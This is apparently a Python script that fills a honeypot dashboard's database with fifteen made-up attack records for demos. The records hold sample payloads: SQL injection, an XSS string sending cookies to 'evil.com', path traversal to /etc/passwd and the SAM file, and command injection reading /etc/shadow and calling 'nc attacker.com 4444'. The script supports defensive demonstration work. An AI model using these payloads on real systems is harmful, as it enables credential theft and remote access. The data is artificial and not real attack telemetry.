#!/usr/bin/env python3
"""
Generador de amenazas realistas para demos y screenshots
CON guardado en base de datos
"""
import sys
sys.path.insert(0, 'src')
import asyncio
from datetime import datetime

async def generate_demo_threats():
    print("=" * 70)
    print("📸 GENERANDO AMENAZAS REALISTAS PARA DEMOS")
    print("=" * 70)
    print()
    
    # Importar después de agregar src al path
    from database.threat_database import ThreatDatabase, ThreatRecord
    
    # Inicializar base de datos
    db = ThreatDatabase("data/nemesis_honeypot.db")
    
    print("✅ Base de datos conectada")
    print()
    
    # Amenazas realistas de diferentes tipos
    threats_data = [
        # SQL Injections
        ('203.0.113.50', 'SQL_INJECTION', 'GET /login?user=admin\' OR \'1\'=\'1\'-- HTTP/1.1'),
        ('198.51.100.42', 'SQL_INJECTION', 'POST /api/user?id=1 UNION SELECT password FROM users--'),
        ('192.0.2.100', 'SQL_INJECTION', 'GET /search?q=\' DROP TABLE users--'),
        
        # XSS Attacks
        ('45.33.32.156', 'XSS', 'GET /comment?text=<script>alert(document.cookie)</script>'),
        ('104.131.191.2', 'XSS', 'POST /forum?msg=<img src=x onerror=fetch(\'evil.com\'+document.cookie)>'),
        
        # Path Traversal
        ('185.220.101.3', 'PATH_TRAVERSAL', 'GET /download?file=../../../../etc/passwd'),
        ('91.219.236.232', 'PATH_TRAVERSAL', 'GET /view?page=../../../windows/system32/config/sam'),
        
        # Command Injection
        ('167.99.173.45', 'COMMAND_INJECTION', 'GET /ping?host=8.8.8.8; cat /etc/shadow'),
        ('159.65.94.183', 'COMMAND_INJECTION', 'POST /exec?cmd=ls -la; nc attacker.com 4444'),
        
        # Brute Force
        ('89.248.172.16', 'BRUTE_FORCE', 'POST /login user=admin pass=password123'),
        ('89.248.172.16', 'BRUTE_FORCE', 'POST /login user=admin pass=admin123'),
        ('89.248.172.16', 'BRUTE_FORCE', 'POST /login user=admin pass=letmein'),
        
        # Port Scan
        ('192.42.116.15', 'PORT_SCAN', 'SYN scan port 22'),
        ('192.42.116.15', 'PORT_SCAN', 'SYN scan port 80'),
        ('192.42.116.15', 'PORT_SCAN', 'SYN scan port 443'),
    ]
    
    print("🎯 Procesando y guardando amenazas en BD...\n")
    
    saved = 0
    
    for ip, attack_type, payload in threats_data:
        try:
            # Crear objeto ThreatRecord
            threat = ThreatRecord(
                id=None,
                timestamp=datetime.now(),
                source_ip=ip,
                attack_type=attack_type,
                payload=payload,
                confidence=0.85,
                action_taken='BLOCK',
                blocked=True
            )
            
            # Guardar en BD
            threat_id = db.save_threat(threat)
            
            print(f"🚨 {ip:18s} | {attack_type:20s} | ✅ GUARDADO (ID: {threat_id})")
            saved += 1
            
        except Exception as e:
            print(f"❌ Error guardando {ip}: {e}")
        
        await asyncio.sleep(0.05)
    
    print()
    print("=" * 70)
    print(f"📊 RESUMEN:")
    print(f"   🚨 Amenazas guardadas: {saved}")
    print("=" * 70)
    
    # Verificar que se guardaron
    stats = db.get_statistics()
    print()
    print(f"✅ VERIFICACIÓN DE BASE DE DATOS:")
    print(f"   Total threats en BD: {stats['total_threats']}")
    print(f"   Blocked IPs: {stats['total_blocked_ips']}")
    print(f"   Last 24h: {stats['threats_last_24h']}")
    
    # Mostrar algunas amenazas
    print()
    print("📋 Últimas 5 amenazas guardadas:")
    recent = db.get_threats(limit=5)
    for t in recent:
        print(f"   • {t.source_ip:18s} → {t.attack_type:20s} ({t.confidence:.0%})")
    
    print()
    print("=" * 70)
    print("✅ AMENAZAS GUARDADAS EXITOSAMENTE")
    print()
    print("   SIGUIENTE PASO:")
    print("   1. Cierra el dashboard si está corriendo (Ctrl+C)")
    print("   2. Abre dashboard: python test_dashboard_unified.py")
    print("   3. Navega a: http://localhost:8080")
    print("   4. Deberías ver las 15 amenazas!")
    print("=" * 70)

if __name__ == "__main__":
    asyncio.run(generate_demo_threats())